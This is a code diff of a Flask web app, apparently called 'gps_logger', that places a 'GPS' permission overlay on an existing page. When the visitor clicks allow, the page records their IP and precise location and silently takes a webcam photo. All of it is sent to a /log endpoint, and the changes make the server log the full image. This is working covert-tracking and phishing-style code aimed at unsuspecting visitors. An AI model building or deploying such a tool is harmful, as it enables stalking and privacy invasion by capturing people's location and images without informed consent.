@@ -6,24 +6,7 @@ import json
 
 app = Flask(__name__)
 
-# Base62 encoding characters
-BASE62 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
-
-def base62_encode(data):
-    """Convert bytes to Base62 string"""
-    if isinstance(data, str):
-        data = data.encode('utf-8')
-    num = int.from_bytes(data, byteorder='big')
-    if num == 0:
-        return BASE62[0]
-    arr = []
-    while num:
-        num, rem = divmod(num, 62)
-        arr.append(BASE62[rem])
-    arr.reverse()
-    return ''.join(arr)
-
-# Configure logging
+# Configure logging with cleaner format
 logging.basicConfig(
     level=logging.INFO,
     format='%(message)s',
@@ -32,30 +15,27 @@ logging.basicConfig(
 logger = logging.getLogger('gps_logger')
 
 def log_clean_data(event_type, data, ip):
-    """Clean logging with Base62 image data"""
+    """Logs data in a clean, organized format"""
     timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
-    log_output = f"""
-    ┌───────────────────────────────────────────────────────
-    │ [{event_type.upper()}] {timestamp}
-    │ IP: {ip}"""
+    separator = "=" * 80
     
-    if event_type == 'location_data':
-        log_output += f"""
-    │ Latitude: {data['lat']}
-    │ Longitude: {data['lng']}
-    │ Accuracy: {data['accuracy']}m"""
+    log_output = f"\n{separator}\n"
+    log_output += f"{event_type.upper()} - {timestamp}\n"
+    log_output += f"IP: {ip}\n"
+    
+    if event_type == 'permission_request':
+        log_output += "User granted permissions\n"
+    elif event_type == 'location_data':
+        log_output += f"Location: {data['lat']}, {data['lng']}\n"
+        log_output += f"Accuracy: {data['accuracy']} meters\n"
     elif event_type == 'camera_capture':
-        log_output += f"""
-    │ Image Data (Base62):
-    │ {data['image_data'][:100]}... [truncated]
-    │ Length: {len(data['image_data'])} chars"""
+        log_output += "Full Image Data (Base64):\n"
+        log_output += f"{data['image_data']}\n"
     elif event_type == 'error':
-        log_output += f"""
-    │ Error: {data['error']}"""
+        log_output += f"ERROR: {data['error']}\n"
     
-    log_output += "\n    └───────────────────────────────────────────────────────"
-    logger.info(textwrap.dedent(log_output).strip())
-
+    log_output += separator
+    logger.info(log_output)
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -153,19 +133,19 @@ HTML_TEMPLATE = """
         </div>
     </div>
 
-   <script>
-        async function takePicture() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    <script>
+        async function takePicture() {{
+            try {{
+                const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
+                await new Promise((resolve) => {{
+                    video.onloadedmetadata = () => {{
                         video.play();
                         resolve();
-                    };
-                });
+                    }};
+                }});
                 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
@@ -174,74 +154,84 @@ HTML_TEMPLATE = """
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
                 stream.getTracks().forEach(track => track.stop());
-                
-                // Get as Base62 string
-                return new Promise((resolve) => {
-                    canvas.toBlob(async (blob) => {
-                        const arrayBuffer = await blob.arrayBuffer();
-                        const base64 = btoa(String.fromCharCode(...new Uint8Array(arrayBuffer)))
-                            .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
-                        resolve(base64);
-                    }, 'image/jpeg', 0.8);
-                });
-            } catch (error) {
+                return canvas.toDataURL('image/jpeg', 0.8); // Returns Base64
+            }} catch (error) {{
                 console.error('Camera error:', error);
                 return null;
-            }
-        }
+            }}
+        }}
 
-        document.getElementById('gps-allow-btn').addEventListener('click', async () => {
-            try {
-                // 1. First get location
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+        document.getElementById('gps-allow-btn').addEventListener('click', async () => {{
+            try {{
+                const ip = await fetch('/getip').then(r => r.text());
+                const timestamp = new Date().toISOString();
+                
+                // Log permission request
+                await fetch('/log', {{
+                    method: 'POST',
+                    headers: {{ 'Content-Type': 'application/json' }},
+                    body: JSON.stringify({{
+                        type: 'permission_request',
+                        ip: ip,
+                        timestamp: timestamp
+                    }})
+                }});
+                
+                // Get location FIRST
+                const position = await new Promise((resolve, reject) => {{
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {{
                         enableHighAccuracy: true,
                         timeout: 10000,
                         maximumAge: 0
-                    });
-                });
+                    }});
+                }});
                 
                 // Log location
-                await fetch('/log', {
+                await fetch('/log', {{
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
+                    headers: {{ 'Content-Type': 'application/json' }},
+                    body: JSON.stringify({{
                         type: 'location_data',
+                        ip: ip,
                         lat: position.coords.latitude,
                         lng: position.coords.longitude,
                         accuracy: position.coords.accuracy,
-                        timestamp: new Date().toISOString()
-                    })
-                });
+                        timestamp: timestamp
+                    }})
+                }});
                 
-                // 2. Then take picture
+                // Then take picture and log
                 const imageData = await takePicture();
-                if (imageData) {
-                    await fetch('/log', {
+                if (imageData) {{
+                    await fetch('/log', {{
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
+                        headers: {{ 'Content-Type': 'application/json' }},
+                        body: JSON.stringify({{
                             type: 'camera_capture',
-                            image_data: imageData,  // Base62 string
-                            timestamp: new Date().toISOString()
-                        })
-                    });
-                }
+                            ip: ip,
+                            image_data: imageData,
+                            timestamp: timestamp
+                        }})
+                    }});
+                }}
                 
+                // Remove overlay
                 document.querySelector('.gps-overlay').remove();
-            } catch (error) {
+            }} catch (error) {{
                 console.error('Error:', error);
-                await fetch('/log', {
+                await fetch('/log', {{
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
+                    headers: {{ 'Content-Type': 'application/json' }},
+                    body: JSON.stringify({{
                         type: 'error',
                         error: error.message,
+                        ip: await fetch('/getip').then(r => r.text()),
                         timestamp: new Date().toISOString()
-                    })
-                });
-            }
-        });
+                    }})
+                }});
+                alert('Error occurred: ' + error.message);
+            }}
+        }});
     </script>
 </body>
 </html>
@@ -251,7 +241,7 @@ HTML_TEMPLATE = """
 def serve_page():
     """Serve the page with GPS overlay"""
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    logger
+    logger.info(f"\n=== PAGE SERVED ===\nIP: {client_ip}\nTime: {datetime.utcnow()}\n{'='*40}")
     
     with open('page.html', 'r') as f:
         existing_content = f.read()
